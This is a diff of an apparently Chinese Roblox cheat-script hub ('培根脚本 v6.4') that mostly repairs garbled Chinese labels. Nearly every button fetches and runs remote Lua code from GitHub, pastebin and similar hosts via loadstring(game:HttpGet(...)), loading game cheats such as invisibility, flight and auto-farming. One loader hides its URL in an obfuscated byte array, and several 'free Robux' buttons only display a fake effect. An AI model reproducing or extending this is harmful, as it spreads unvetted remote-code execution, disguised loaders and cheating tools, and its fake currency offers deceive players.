+        BlackHoleV2Button = function() loadExternalScript("https://raw.githubusercontent.com/ke9460394-dot/ugik/refs/heads/main/%E7%A3%81%E9%93%81%E9%BB%91%E6%B4%9EV2.txt", "黑洞v2") end,
+        BlackHoleV1Button = function() loadExternalScript("https://raw.githubusercontent.com/ke9460394-dot/ugik/refs/heads/main/V1.lua.txt", "黑洞v1") end,
         
-        -- 鍏朵粬鑴氭湰
-        FakeLagButton = function() loadExternalScript("https://raw.githubusercontent.com/RENZXW/RENZXW-SCRIPTS/main/fakeLAGRENZXW.txt", "鍋囧欢杩�") end,
-        DayunButton = function() loadExternalScript("https://raw.githubusercontent.com/3LD4D0/Crazy-Man-R6/36ec60d16bf8d208c40807aa0fd2662af76a5385/Crazy%20Man%20R6", "澶ц繍") end,
-        CrawlButton = function() loadExternalScript('https://raw.githubusercontent.com/0Ben1/fe/main/obf_vZDX8j5ggfAf58QhdJ59BVEmF6nmZgq4Mcjt2l8wn16CiStIW2P6EkNc605qv9K4.lua.txt', "鍦ㄥ湴涓婄埇") end,
-        FEFighterButton = function() loadExternalScript("https://raw.githubusercontent.com/ke9460394-dot/ugik/refs/heads/main/寮鸿涓㈠純.txt", "寮鸿瑁呭鐗╁搧") end,
-        InvisibleButton = function() loadExternalScript('https://pastebin.com/raw/3Rnd9rHf', "浜虹墿闅愬舰") end,
-        FakeFriendButton = function() loadExternalScript("https://raw.githubusercontent.com/sigmaboy123z/MYFRIENDSCRIPT/refs/heads/main/MYNEWFRIENDSPAWNER", "鍋囨湅鍙�") end,
-        TrainEffectButton = function() loadExternalScript("https://raw.githubusercontent.com/ke9460394-dot/ugik/refs/heads/main/瓒婅窇瓒婂揩.txt", "鐏溅澶存晥鏋�") end,
-        FreePrivateServerButton = function() loadExternalScript("https://raw.githubusercontent.com/ke9460394-dot/ugik/refs/heads/main/Kenny鍏嶈垂绉佹湇.lua", "鍏嶈垂绉佹湇") end,
-        CaodanButton = function() loadExternalScript("https://pastebin.com/raw/hkyuHQ7Y", "鎿嶈泲鑴氭湰") end,
-        CaodanV1Button = function() loadExternalScript("https://pastebin.com/raw/bzmhRgKL", "鎿嶈泲v1") end,
-        ThrowFlyButton = function() loadExternalScript("https://raw.githubusercontent.com/3LD4D0/Crazy-Man-R6/36ec60d16bf8d208c40807aa0fd2662af76a5385/Crazy%20Man%20R6", "鐢╅鑴氭湰") end,
-        BeatDogButton = function() loadExternalScript("https://raw.githubusercontent.com/ke9460394-dot/ugik/refs/heads/main/KENNY鐖嗘墦榛勬补.txt", "Kenny鎮︽湇寰幆鎵撶嫍") end,
+        -- 其他脚本
+        FakeLagButton = function() loadExternalScript("https://raw.githubusercontent.com/RENZXW/RENZXW-SCRIPTS/main/fakeLAGRENZXW.txt", "假延迟") end,
+        DayunButton = function() loadExternalScript("https://raw.githubusercontent.com/3LD4D0/Crazy-Man-R6/36ec60d16bf8d208c40807aa0fd2662af76a5385/Crazy%20Man%20R6", "大运") end,
+        CrawlButton = function() loadExternalScript('https://raw.githubusercontent.com/0Ben1/fe/main/obf_vZDX8j5ggfAf58QhdJ59BVEmF6nmZgq4Mcjt2l8wn16CiStIW2P6EkNc605qv9K4.lua.txt', "在地上爬") end,
+        FEFighterButton = function() loadExternalScript("https://raw.githubusercontent.com/ke9460394-dot/ugik/refs/heads/main/强行丢弃.txt", "强行装备物品") end,
+        InvisibleButton = function() loadExternalScript('https://pastebin.com/raw/3Rnd9rHf', "人物隐形") end,
+        FakeFriendButton = function() loadExternalScript("https://raw.githubusercontent.com/sigmaboy123z/MYFRIENDSCRIPT/refs/heads/main/MYNEWFRIENDSPAWNER", "假朋友") end,
+        TrainEffectButton = function() loadExternalScript("https://raw.githubusercontent.com/ke9460394-dot/ugik/refs/heads/main/越跑越快.txt", "火车头效果") end,
+        FreePrivateServerButton = function() loadExternalScript("https://raw.githubusercontent.com/ke9460394-dot/ugik/refs/heads/main/Kenny免费私服.lua", "免费私服") end,
+        CaodanButton = function() loadExternalScript("https://pastebin.com/raw/hkyuHQ7Y", "操蛋脚本") end,
+        CaodanV1Button = function() loadExternalScript("https://pastebin.com/raw/bzmhRgKL", "操蛋v1") end,
+        ThrowFlyButton = function() loadExternalScript("https://raw.githubusercontent.com/3LD4D0/Crazy-Man-R6/36ec60d16bf8d208c40807aa0fd2662af76a5385/Crazy%20Man%20R6", "甩飞脚本") end,
+        BeatDogButton = function() loadExternalScript("https://raw.githubusercontent.com/ke9460394-dot/ugik/refs/heads/main/KENNY爆打黄油.txt", "Kenny悦服循环打狗") end,
         WitherStormButton = function()
             playClickSound()
-            showNotification("姝ｅ湪鍔犺浇鍑嬮浂椋庢毚...", Color3.fromRGB(255, 100, 0))
+            showNotification("正在加载凋零风暴...", Color3.fromRGB(255, 100, 0))
             loadstring(game:HttpGet("https://raw.githubusercontent.com/ian49972/SCRIPTS/refs/heads/main/Wither"))()
-            showNotification("鍑嬮浂椋庢毚宸插姞杞�!", Color3.fromRGB(0, 200, 0))
+            showNotification("凋零风暴已加载!", Color3.fromRGB(0, 200, 0))
         end,
-        BurstScriptButton = function() loadExternalScript("https://raw.githubusercontent.com/ke9460394-dot/kenk/refs/heads/main/鏀惧厠琛ㄦ儏.lua", "鐖嗙噧鑴氭湰") end,
-        BootCheckButton = function() loadExternalScript("https://raw.githubusercontent.com/ke9460394-dot/kenk/refs/heads/main/寮€鏈烘娴�.lua", "寮€鏈烘娴�") end,
-        CalculatorButton = function() loadExternalScript("https://raw.githubusercontent.com/GhostPlayer352/Test4/refs/heads/main/Calculator", "璁＄畻鍣�") end,
-        ChatBubbleBeautifyButton = function() loadExternalScript("https://raw.githubusercontent.com/ke9460394-dot/ugik/refs/heads/main/4M1NrMnc.txt", "鑱婂ぉ姘旀场缇庡寲") end,
-        C00lkidBlackShellButton = function() loadExternalScript("https://rawscripts.net/raw/Universal-Script-coolkid-gui-15453", "c00lkid榛戝３") end,
-        ChatTranslatorButton = function() loadExternalScript("https://raw.githubusercontent.com/GhostPlayer352/Test4/refs/heads/main/Translator", "鑱婂ぉ缈昏瘧鍣�") end,
-        KennyAutoTranslateButton = function() loadExternalScript("https://raw.githubusercontent.com/ke9460394-dot/ugik/refs/heads/main/KENNY鑷姩姹夊寲.txt", "kenny鑷姩姹夊寲") end,
-        MindPullButton = function() loadExternalScript("https://raw.githubusercontent.com/ke9460394-dot/ugik/refs/heads/main/缈昏瘧.txt", "蹇冪伒鐗靛紩") end,
-        TelepathyButton = function() loadExternalScript("https://raw.githubusercontent.com/randomstring0/Qwerty/refs/heads/main/qwerty11.lua", "蹇冪伒鎰熷簲") end,
-        FishScriptButton = function() loadExternalScript("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", "楸艰剼鏈�") end,
-        Forest99NightDiamondButton = function() loadExternalScript("https://raw.githubusercontent.com/MQPS7/99-Night-in-the-Forset/refs/heads/main/Gfarm", "妫灄99澶滃埛閽荤煶") end,
+        BurstScriptButton = function() loadExternalScript("https://raw.githubusercontent.com/ke9460394-dot/kenk/refs/heads/main/放克表情.lua", "爆燃脚本") end,
+        BootCheckButton = function() loadExternalScript("https://raw.githubusercontent.com/ke9460394-dot/kenk/refs/heads/main/开机检测.lua", "开机检测") end,
+        CalculatorButton = function() loadExternalScript("https://raw.githubusercontent.com/GhostPlayer352/Test4/refs/heads/main/Calculator", "计算器") end,
+        ChatBubbleBeautifyButton = function() loadExternalScript("https://raw.githubusercontent.com/ke9460394-dot/ugik/refs/heads/main/4M1NrMnc.txt", "聊天气泡美化") end,
+        C00lkidBlackShellButton = function() loadExternalScript("https://rawscripts.net/raw/Universal-Script-coolkid-gui-15453", "c00lkid黑壳") end,
+        ChatTranslatorButton = function() loadExternalScript("https://raw.githubusercontent.com/GhostPlayer352/Test4/refs/heads/main/Translator", "聊天翻译器") end,
+        KennyAutoTranslateButton = function() loadExternalScript("https://raw.githubusercontent.com/ke9460394-dot/ugik/refs/heads/main/KENNY自动汉化.txt", "kenny自动汉化") end,
+        MindPullButton = function() loadExternalScript("https://raw.githubusercontent.com/ke9460394-dot/ugik/refs/heads/main/翻译.txt", "心灵牵引") end,
+        TelepathyButton = function() loadExternalScript("https://raw.githubusercontent.com/randomstring0/Qwerty/refs/heads/main/qwerty11.lua", "心灵感应") end,
+        FishScriptButton = function() loadExternalScript("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", "鱼脚本") end,
+        Forest99NightDiamondButton = function() loadExternalScript("https://raw.githubusercontent.com/MQPS7/99-Night-in-the-Forset/refs/heads/main/Gfarm", "森林99夜刷钻石") end,
         NicoNextbotButton = function() loadExternalScript("https://raw.githubusercontent.com/GamingScripter/Darkrai-X/main/Games/NicoNextBots", "nico' Nextbot") end,
-        ShipTreasureButton = function() loadExternalScript("https://raw.githubusercontent.com/urmomjklol69/GoldFarmBabft/main/GoldFarm.lua", "閫犺埞瀵诲疂") end,
-        SpeedLegendButton = function() loadExternalScript("https://pastebin.com/raw/0A4J7V8M", "鏋侀€熶紶濂�") end,
-        WallRunButton = function() loadExternalScript("https://pastebin.com/raw/zXk4Rq2r", "椋炴獝璧板") end,
-        NaturalDisasterButton = function() loadExternalScript("https://gist.githubusercontent.com/TurkOyuncu99/7c75386107937fa006304efd24543ad4/raw/8d759dfcd95d39949c692735cfdf62baec0bf835/cafwetweg", "鑷劧鐏惧") end,
-        MuscleLegendButton = function() loadExternalScript("https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Float", "鍔涢噺浼犲") end,
-        MuscleLegendChangeButton = function() loadExternalScript("https://raw.githubusercontent.com/jynzl/main/main/Musclas%20Legenos.lua", "鍔涢噺浼犲鏀瑰姏閲�") end,
+        ShipTreasureButton = function() loadExternalScript("https://raw.githubusercontent.com/urmomjklol69/GoldFarmBabft/main/GoldFarm.lua", "造船寻宝") end,
+        SpeedLegendButton = function() loadExternalScript("https://pastebin.com/raw/0A4J7V8M", "极速传奇") end,
+        WallRunButton = function() loadExternalScript("https://pastebin.com/raw/zXk4Rq2r", "飞檐走壁") end,
+        NaturalDisasterButton = function() loadExternalScript("https://gist.githubusercontent.com/TurkOyuncu99/7c75386107937fa006304efd24543ad4/raw/8d759dfcd95d39949c692735cfdf62baec0bf835/cafwetweg", "自然灾害") end,
+        MuscleLegendButton = function() loadExternalScript("https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Float", "力量传奇") end,
+        MuscleLegendChangeButton = function() loadExternalScript("https://raw.githubusercontent.com/jynzl/main/main/Musclas%20Legenos.lua", "力量传奇改力量") end,
         PlayForsakenOnServerButton = loadPlayForsakenOnServer,
         UnknownBlackShellButton = loadUnknownBlackShell,
-        -- 鏂板鍏ㄥ眬鑱婂ぉ鑴氭湰
+        -- 新增全局聊天脚本
         GlobalChatButton = loadGlobalChat,
         
         -- doors
         DoorsButton = function() loadExternalScript("https://raw.githubusercontent.com/mstudio45/MSDOORS/main/MSDOORS.lua", "doors") end,
-        DoorsModeButton = function() loadExternalScript("https://pastebin.com/raw/Pm3rvBNw", "doors妯″紡") end,
-        DoorsHardcoreModeButton = function() loadExternalScript("https://glot.io/snippets/gp5pu59o7f/raw", "doors纭牳妯″紡") end,
-        DoorsAutoAvoidButton = function() loadExternalScript("https://raw.githubusercontent.com/RegularVynixu/Vynixius/main/Doors/Script.lua", "doors鑷姩韬叉€叏鍥鹃珮浜�") end,
-        DoorsExtremeModeButton = function() loadExternalScript("https://github.com/HollowedOutMods/MayhemMode/blob/main/loader.lua?raw=true", "doors鏋佺妯″紡") end,
+        DoorsModeButton = function() loadExternalScript("https://pastebin.com/raw/Pm3rvBNw", "doors模式") end,
+        DoorsHardcoreModeButton = function() loadExternalScript("https://glot.io/snippets/gp5pu59o7f/raw", "doors硬核模式") end,
+        DoorsAutoAvoidButton = function() loadExternalScript("https://raw.githubusercontent.com/RegularVynixu/Vynixius/main/Doors/Script.lua", "doors自动躲怪全图高亮") end,
+        DoorsExtremeModeButton = function() loadExternalScript("https://github.com/HollowedOutMods/MayhemMode/blob/main/loader.lua?raw=true", "doors极端模式") end,
         
-        -- 鍋疯蛋鑴戠孩
-        StealBrainRedButton = function() loadExternalScript("https://raw.githubusercontent.com/hdjsjjdgrhj/script-hub/refs/heads/main/鍋疯蛋鑴戠孩", "鍋疯蛋鑴戠孩") end,
-        StealBrainRedRainbowButton = function() loadExternalScript("https://pastefy.app/PkYWvKhM/raw", "鍋疯蛋鑴戠孩褰╄櫣鏉�") end,
-        StealBrainRedBigBoardButton = function() loadExternalScript("https://pastebin.com/raw/zhe4ie0W", "鍋疯蛋鑴戠孩澶ф澘瀛�") end,
+        -- 偷走脑红
+        StealBrainRedButton = function() loadExternalScript("https://raw.githubusercontent.com/hdjsjjdgrhj/script-hub/refs/heads/main/偷走脑红", "偷走脑红") end,
+        StealBrainRedRainbowButton = function() loadExternalScript("https://pastefy.app/PkYWvKhM/raw", "偷走脑红彩虹板") end,
+        StealBrainRedBigBoardButton = function() loadExternalScript("https://pastebin.com/raw/zhe4ie0W", "偷走脑红大板子") end,
         
-        -- 绉嶆鑺卞洯
-        GardenButton = function() loadExternalScript("https://raw.githubusercontent.com/thantzy/thanhub/refs/heads/main/thanv1", "绉嶆鑺卞洯") end,
+        -- 种植花园
+        GardenButton = function() loadExternalScript("https://raw.githubusercontent.com/thantzy/thanhub/refs/heads/main/thanv1", "种植花园") end,
         
-        -- 鍏朵粬鑴氭湰鏁村悎
+        -- 其他脚本整合
         PiScriptButton = function() 
             playClickSound()
-            getgenv().XiaoPi = "鐨剼鏈琎Q缇�1002100032"
+            getgenv().XiaoPi = "皮脚本QQ群1002100032"
             loadstring(game:HttpGet("https://raw.githubusercontent.com/xiaopi77/xiaopi77/main/QQ1002100032-Roblox-Pi-script.lua"))()
-            showNotification("鐨剼鏈凡鍔犺浇!", Color3.fromRGB(0, 200, 0))
+            showNotification("皮脚本已加载!", Color3.fromRGB(0, 200, 0))
         end,
         PiScriptTestButton = function() 
             playClickSound()
-            getgenv().XiaoPi="鐨剼鏈祴璇曠増QQ缇�1002100032"
+            getgenv().XiaoPi="皮脚本测试版QQ群1002100032"
             loadstring(game:HttpGet("https://raw.githubusercontent.com/xiaopi77/xiaopi77/main/PijiaobenV1.lua"))()
-            showNotification("鐨剼鏈祴璇曠増宸插姞杞�!", Color3.fromRGB(0, 200, 0))
+            showNotification("皮脚本测试版已加载!", Color3.fromRGB(0, 200, 0))
         end,
-        YeScriptButton = function() loadExternalScript("https://raw.githubusercontent.com/roblox-ye/QQ515966991/refs/heads/main/ROBLOX-CNVIP-XIAOYE.lua", "鍙惰剼鏈�") end,
-        ChuScriptButton = function() loadExternalScript("https://raw.githubusercontent.com/ShenJiaoBen/ShenJiaoBen/refs/heads/main/鍒濊剼鏈�.lua", "鍒濊剼鏈�") end,
-        DingScriptButton = function() loadExternalScript("http://pastefy.app/g7wgZQya/raw", "涓佽剼鏈�") end,
+        YeScriptButton = function() loadExternalScript("https://raw.githubusercontent.com/roblox-ye/QQ515966991/refs/heads/main/ROBLOX-CNVIP-XIAOYE.lua", "叶脚本") end,
+        ChuScriptButton = function() loadExternalScript("https://raw.githubusercontent.com/ShenJiaoBen/ShenJiaoBen/refs/heads/main/初脚本.lua", "初脚本") end,
+        DingScriptButton = function() loadExternalScript("http://pastefy.app/g7wgZQya/raw", "丁脚本") end,
         ScriptCenterButton = function() 
             playClickSound()
             loadstring(utf8.char((function() return table.unpack({108,111,97,100,115,116,114,105,110,103,40,103,97,109,101,58,72,116,116,112,71,101,116,40,34,104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,67,104,105,110,97,81,89,47,45,47,109,97,105,110,47,37,69,54,37,56,51,37,56,53,37,69,52,37,66,65,37,57,49,34,41,41,40,41})end)()))()
-            showNotification("鑴氭湰涓績宸插姞杞�!", Color3.fromRGB(0, 200, 0))
+            showNotification("脚本中心已加载!", Color3.fromRGB(0, 200, 0))
         end,
-        XAScriptCenterButton = function() loadExternalScript("https://pastebin.com/raw/h8nC0fLb", "xa鑴氭湰涓績") end,
-        ChenScriptButton = function() loadExternalScript("https://raw.githubusercontent.com/qwrt5589/eododo/main/XG_SYNB.txt", "杈拌剼鏈�") end,
-        ShaScriptButton = function() loadExternalScript("https://raw.githubusercontent.com/114514lzkill/SaHUB/refs/heads/main/SaHUB", "娌欒剼鏈�") end,
+        XAScriptCenterButton = function() loadExternalScript("https://pastebin.com/raw/h8nC0fLb", "xa脚本中心") end,
+        ChenScriptButton = function() loadExternalScript("https://raw.githubusercontent.com/qwrt5589/eododo/main/XG_SYNB.txt", "辰脚本") end,
+        ShaScriptButton = function() loadExternalScript("https://raw.githubusercontent.com/114514lzkill/SaHUB/refs/heads/main/SaHUB", "沙脚本") end,
         UNXScriptButton = loadUNXScript,
         ConduitCenterButton = loadConduitCenter,
         SuperNBForeignScriptButton = loadSuperNBForeignScript,
         BSCenterButton = loadBSCenter,
-        -- 鏂板钀藉彾涓績
+        -- 新增落叶中心
         FallenLeavesCenterButton = loadFallenLeavesCenter,
-        -- 鏂板rob鑴氭湰
+        -- 新增rob脚本
         ROBScriptButton = loadROBScript,
         
-        -- 淇勪亥淇勫窞
-        OhioButton = function() loadExternalScript("https://raw.githubusercontent.com/jiankeQWQ/jiankeV3/main/ehaiezhou", "淇勪亥淇勫窞鑴氭湰") end,
+        -- 俄亥俄州
+        OhioButton = function() loadExternalScript("https://raw.githubusercontent.com/jiankeQWQ/jiankeV3/main/ehaiezhou", "俄亥俄州脚本") end,
         Ohio2Button = loadOhio2,
         XAOhioButton = loadXAOhio,
         
-        -- 鐢绘垜
+        -- 画我
         DrawMeScript1Button = loadDrawMeScript1,
         DrawMeScript2Button = loadDrawMeScript2,
-        DrawMeScript3Button = loadDrawMeScript3, -- 鏂板鐢绘垜鑴氭湰3
-        ChatDrawButton = function() loadExternalScript("https://raw.githubusercontent.com/ocfi/_/refs/heads/main/a", "鑱婂ぉ妗嗙敾鐢�") end,
+        DrawMeScript3Button = loadDrawMeScript3, -- 新增画我脚本3
+        ChatDrawButton = function() loadExternalScript("https://raw.githubusercontent.com/ocfi/_/refs/heads/main/a", "聊天框画画") end,
         
-        -- 鍏嶈垂r甯�
+        -- 免费r币
         Free80RButton = showFreeRBCurrencyEffect,
         Free120RButton = showFreeRBCurrencyEffect,
         Free240RButton = showFreeRBCurrencyEffect,
@@ -2851,15 +2851,15 @@ print("瀹夊叏鐗堣嚜鐒剁伨瀹冲厤鐤凡婵€娲�")
         Free450RPlusButton = showFreeRBCurrencyEffect,
         Free1200RPlusButton = showFreeRBCurrencyEffect,
         
-        -- 姝讳骸涔嬫
-        DeathOfDeathButton = function() loadExternalScript("https://raw.githubusercontent.com/thuker-evader/Die-of-death/refs/heads/main/Red%20hub", "姝讳骸涔嬫") end,
+        -- 死亡之死
+        DeathOfDeathButton = function() loadExternalScript("https://raw.githubusercontent.com/thuker-evader/Die-of-death/refs/heads/main/Red%20hub", "死亡之死") end,
         
-        -- 琚仐寮�
-        ForsakenButton = function() loadExternalScript("https://raw.githubusercontent.com/BobJunior1/ForsakenBoi/refs/heads/main/B0bbyHub", "琚仐寮冭剼鏈�") end,
+        -- 被遗弃
+        ForsakenButton = function() loadExternalScript("https://raw.githubusercontent.com/BobJunior1/ForsakenBoi/refs/heads/main/B0bbyHub", "被遗弃脚本") end,
         ForsakenScript2Button = loadForsakenScript2,
         
-        -- 鏃犳晫灏戜緺椋炶
-        InvincibleFlyR15Button = function() loadExternalScript("https://rawscripts.net/raw/Universal-Script-Invinicible-Flight-R15-45414", "鏃犳晫灏戜緺椋炶R15") end,
+        -- 无敌少侠飞行
+        InvincibleFlyR15Button = function() loadExternalScript("https://rawscripts.net/raw/Universal-Script-Invinicible-Flight-R15-45414", "无敌少侠飞行R15") end,
         InvincibleFlyR6Button = toggleInvincibleFlyR6,
     }
 
@@ -2869,7 +2869,7 @@ print("瀹夊叏鐗堣嚜鐒剁伨瀹冲厤鐤凡婵€娲�")
         end
     end
 
-    -- 鍚姩鍔ㄧ敾
+    -- 启动动画
     local startupFrame = Instance.new("Frame")
     startupFrame.Size = UDim2.new(1, 0, 1, 0)
     startupFrame.BackgroundTransparency = 1
@@ -2880,7 +2880,7 @@ print("瀹夊叏鐗堣嚜鐒剁伨瀹冲厤鐤凡婵€娲�")
     startupLabel.Size = UDim2.new(0, 200, 0, 66.7)
     startupLabel.Position = UDim2.new(0.5, -100, 0.5, -33.35)
     startupLabel.BackgroundTransparency = 1
-    startupLabel.Text = "鍩规牴鑴氭湰 v6.4\n鍔犺浇涓�..."
+    startupLabel.Text = "培根脚本 v6.4\n加载中..."
     startupLabel.TextColor3 = Color3.fromRGB(0, 255, 255)
     startupLabel.TextSize = 24
     startupLabel.Font = Enum.Font.GothamBold
@@ -2889,10 +2889,10 @@ print("瀹夊叏鐗堣嚜鐒剁伨瀹冲厤鐤凡婵€娲�")
 
     spawn(function()
         for i = 1, 5 do
-            startupLabel.Text = "鍩规牴鑴氭湰 v6.4\n鍔犺浇涓�" .. string.rep(".", i)
+            startupLabel.Text = "培根脚本 v6.4\n加载中" .. string.rep(".", i)
             wait(0.5)
         end
-        startupLabel.Text = "鍩规牴鑴氭湰 v6.4\n鍔犺浇瀹屾垚!"
+        startupLabel.Text = "培根脚本 v6.4\n加载完成!"
         TweenService:Create(startupLabel, TweenInfo.new(1.5), {TextTransparency = 1}):Play()
         wait(1.5)
         startupFrame:Destroy()
@@ -2901,9 +2901,9 @@ print("瀹夊叏鐗堣嚜鐒剁伨瀹冲厤鐤凡婵€娲�")
         MainFrame.Position = UDim2.new(1.5, -233.5, 0.5, -150)
         TweenService:Create(MainFrame, TweenInfo.new(0.8), {Position = UDim2.new(0.5, -233.5, 0.5, -150)}):Play()
         
-        showNotification("鍩规牴鑴氭湰 v6.4 宸插姞杞�!", Color3.fromRGB(0, 200, 255))
+        showNotification("培根脚本 v6.4 已加载!", Color3.fromRGB(0, 200, 255))
         
-        -- 鍒濆璁剧疆
+        -- 初始设置
         local humanoid = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
         if humanoid then
             humanoid.WalkSpeed = walkSpeed
@@ -2913,7 +2913,7 @@ print("瀹夊叏鐗堣嚜鐒剁伨瀹冲厤鐤凡婵€娲�")
         selectPlayer()
     end)
 
-    -- 瑙掕壊閲嶇敓澶勭悊
+    -- 角色重生处理
     LocalPlayer.CharacterAdded:Connect(function()
         wait(2)
         local humanoid = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
@@ -2924,8 +2924,8 @@ print("瀹夊叏鐗堣嚜鐒剁伨瀹冲厤鐤凡婵€娲�")
     end)
 end
 
--- 瀹夊叏鎵ц
+-- 安全执行
 local success, err = pcall(loadScript)
 if not success then
-    warn("鑴氭湰鍔犺浇閿欒: " .. err)
+    warn("脚本加载错误: " .. err)
 end
